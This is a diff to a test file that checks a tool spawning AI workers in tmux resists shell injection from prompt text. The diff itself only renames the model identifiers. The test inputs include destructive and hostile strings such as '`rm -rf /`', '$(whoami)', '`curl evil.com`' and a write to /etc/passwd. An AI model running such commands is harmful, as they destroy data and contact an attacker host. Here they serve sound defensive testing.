@@ -38,7 +38,7 @@ beforeEach(() => {
 describe('shell injection prevention', () => {
   it('prompt content is never embedded in the tmux command string', () => {
     const prompt = 'This is a normal prompt with some text';
-    spawnWorker('task-001', 'sonnet', prompt, '/project');
+    spawnWorker('task-001', 'claude-sonnet-5', prompt, '/project');
 
     const sendKeysCall = mockedSpawnSync.mock.calls[1];
     const args = sendKeysCall![1] as string[];
@@ -52,7 +52,7 @@ describe('shell injection prevention', () => {
   });
 
   it('$() subshell syntax in prompt does not appear in command args', () => {
-    spawnWorker('task-002', 'opus', '$(whoami)', '/project');
+    spawnWorker('task-002', 'claude-opus-4-8', '$(whoami)', '/project');
 
     const sendKeysCall = mockedSpawnSync.mock.calls[1];
     const args = sendKeysCall![1] as string[];
@@ -61,7 +61,7 @@ describe('shell injection prevention', () => {
   });
 
   it('backtick command substitution in prompt does not appear in command args', () => {
-    spawnWorker('task-003', 'opus', '`rm -rf /`', '/project');
+    spawnWorker('task-003', 'claude-opus-4-8', '`rm -rf /`', '/project');
 
     const sendKeysCall = mockedSpawnSync.mock.calls[1];
     const args = sendKeysCall![1] as string[];
@@ -71,7 +71,7 @@ describe('shell injection prevention', () => {
   });
 
   it('${} variable expansion in prompt does not appear in command args', () => {
-    spawnWorker('task-004', 'sonnet', '${HOME}; ${PATH}; ${SECRET}', '/project');
+    spawnWorker('task-004', 'claude-sonnet-5', '${HOME}; ${PATH}; ${SECRET}', '/project');
 
     const sendKeysCall = mockedSpawnSync.mock.calls[1];
     const args = sendKeysCall![1] as string[];
@@ -83,7 +83,7 @@ describe('shell injection prevention', () => {
 
   it('combined dangerous metacharacters do not leak into command', () => {
     const dangerous = "$(rm -rf /); `curl evil.com`; ${PATH}; echo 'pwned' > /etc/passwd";
-    spawnWorker('task-005', 'haiku', dangerous, '/project');
+    spawnWorker('task-005', 'claude-haiku-4-5-20251001', dangerous, '/project');
 
     const sendKeysCall = mockedSpawnSync.mock.calls[1];
     const args = sendKeysCall![1] as string[];
@@ -96,7 +96,7 @@ describe('shell injection prevention', () => {
 
   it('writePromptFile creates a file with the correct prompt content', () => {
     const prompt = 'Build the dashboard feature';
-    spawnWorker('task-006', 'sonnet', prompt, '/project');
+    spawnWorker('task-006', 'claude-sonnet-5', prompt, '/project');
 
     // writeFileSync should be called with the prompt content written to the temp file
     const writeCall = mockedWriteFileSync.mock.calls.find(
@@ -108,7 +108,7 @@ describe('shell injection prevention', () => {
   });
 
   it('prompt file path includes unique random id', () => {
-    spawnWorker('task-007', 'sonnet', 'test prompt', '/project');
+    spawnWorker('task-007', 'claude-sonnet-5', 'test prompt', '/project');
 
     const writeCall = mockedWriteFileSync.mock.calls.find(
       (c) => String(c[0]).includes('.prompt-'),
